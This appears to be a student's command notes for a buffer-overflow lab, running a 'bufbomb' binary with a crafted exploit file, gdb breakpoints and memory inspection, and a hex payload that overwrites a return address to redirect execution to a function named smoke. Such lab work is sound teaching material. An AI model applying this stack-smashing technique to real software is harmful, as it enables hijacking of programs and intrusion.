chmod u+x sendstring
chmod u+x makecookie
chmod u+x bufbomb


./sendstring < exploit.txt > exploit-raw.txt && ./bufbomb -t SA18225155 < exploit-raw.txt 

./sendstring < exploit.txt > exploit-raw.txt && ./bufbomb -t SA22011105 < exploit-raw.txt



./sendstring < exploit.txt > exploit-raw.txt

./bufbomb -t SA22011105 < exploit-raw.txt

gdb ./bufbomb
set args -t SA22011105 < exploit-raw.txt

b *0x8048dd6

00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 20 8e 04 08

x/s $ebp-0xc

p/x &smoke